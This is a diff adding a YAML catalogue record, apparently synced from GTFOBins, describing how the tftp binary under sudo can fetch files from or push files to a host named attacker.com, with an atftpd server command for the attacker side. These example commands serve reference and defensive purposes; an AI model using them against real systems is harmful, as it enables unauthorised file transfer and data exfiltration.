@@ -1,0 +1,95 @@
+id: gtfobins/tftp/download/sudo
+type: binary
+platform: linux
+name: tftp
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'tftp attacker.com
+
+    get /path/to/input-file'
+references:
+- https://gtfobins.github.io/gtfobins/tftp/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        tftp:
+          functions:
+            download:
+            - code: 'tftp attacker.com
+
+                get /path/to/input-file'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender:
+                code: atftpd --no-fork --verbose --daemon --no-fork --user root.root .
+                comment: A TFTP server can be used on the attacker box to send the data.
+            upload:
+            - code: 'tftp attacker.com
+
+                put /path/to/input-file'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver:
+                code: atftpd --no-fork --verbose --daemon --no-fork --user root.root .
+                comment: A TFTP server can be used on the attacker box to receive the data.
+    upstream_url: https://gtfobins.github.io/gtfobins/tftp/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:850c0da99b839864855410cc35f9b235a62ad07f91dce97db2204d8731f86e51
